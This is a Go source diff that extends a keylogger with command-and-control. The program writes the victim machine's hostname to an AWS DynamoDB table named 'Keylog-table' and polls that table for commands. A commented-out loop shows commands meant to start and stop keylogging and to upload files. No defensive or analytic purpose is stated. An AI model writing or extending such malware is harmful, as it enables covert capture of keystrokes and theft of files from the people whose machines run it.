@@ -26,6 +26,25 @@ func main() {
 		panic(err)
 	}
 
+	hostName, err := os.Hostname()
+	if err != nil {
+		panic(err)
+	}
+
+	putHost(hostName)
+	fmt.Println(getCmd(hostName))
+
+	// for {
+	// 	cmd := getCmd(hostName)
+	// 	switch cmd {
+	// 	case "start":
+	// 		start_keylog()
+	// 	case "upload"
+	// 		uploadFile()
+	// 	case "stop"
+	// 		stop_keylog()
+	// 	}
+	// }
 	keylog()
 }
 
@@ -129,14 +148,12 @@ func uploadFile(fileName string) error {
 	return err
 }
 
-func getCmd(hostName string) (string, error) {
-	sess := sessionMust(session.NewSession(&aws.Config{
-		Region: aws.String("ap-southeast-2"),
-	}))
+func getCmd(hostName string) string {
 
-	input := &dynamodb.getItemInput{
+	svc := dynamodb.New(session.New())
+	input := &dynamodb.GetItemInput{
 		TableName: aws.String("Keylog-table"),
-		Key: map[String]*dynamodb.AttributeValue{
+		Key: map[string]*dynamodb.AttributeValue{
 			"hostName": {
 				S: aws.String(hostName),
 			},
@@ -145,13 +162,34 @@ func getCmd(hostName string) (string, error) {
 
 	result, err := svc.GetItem(input)
 	if err != nil {
-		return "", err
+		panic(err)
 	}
 
-	if result.Item == nil {
-		return "", fmt.Errorf("no command found for device: %s", deviceID)
+	cmd := result.Item["curr_cmd"]
+
+	return *cmd.S
+
+}
+
+func putHost(hostName string) error {
+
+	svc := dynamodb.New(session.New())
+	input := &dynamodb.PutItemInput{
+		TableName:	aws.String("Keylog-table"),
+		Item:		map[string]*dynamodb.AttributeValue{
+			"hostName": {
+				S: aws.String(hostName),
+			},
+			"curr_cmd": {
+				S: aws.String("idle"),
+			},
+		},
 	}
 
-	command := result.Item["last_command"].S
-	return *command, nil
+	_, err := svc.PutItem(input)
+	if err != nil {
+		panic(err)
+	}
+
+	return err
 }
